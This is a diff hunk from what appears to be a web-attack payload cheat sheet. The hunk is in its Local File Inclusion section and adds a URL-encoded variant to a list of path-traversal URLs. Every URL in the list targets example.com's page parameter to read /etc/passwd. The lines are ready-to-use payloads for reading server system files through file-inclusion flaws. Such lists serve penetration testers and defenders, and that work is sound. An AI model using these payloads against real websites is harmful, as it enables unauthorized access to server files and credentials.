@@ -90,6 +90,7 @@ http://example.com/index.php?page=../../../[ADD MORE]../../../../etc/passwd
 http://example.com/index.php?page=....//....//etc/passwd
 http://example.com/index.php?page=..///////..////..//////etc/passwd
 http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
+http://example.com/index.php?page=%2F%7Betc%2C%7D%2F%7Bpasswd%2C%7D
 ```
 
 ## Remote File Inclusion
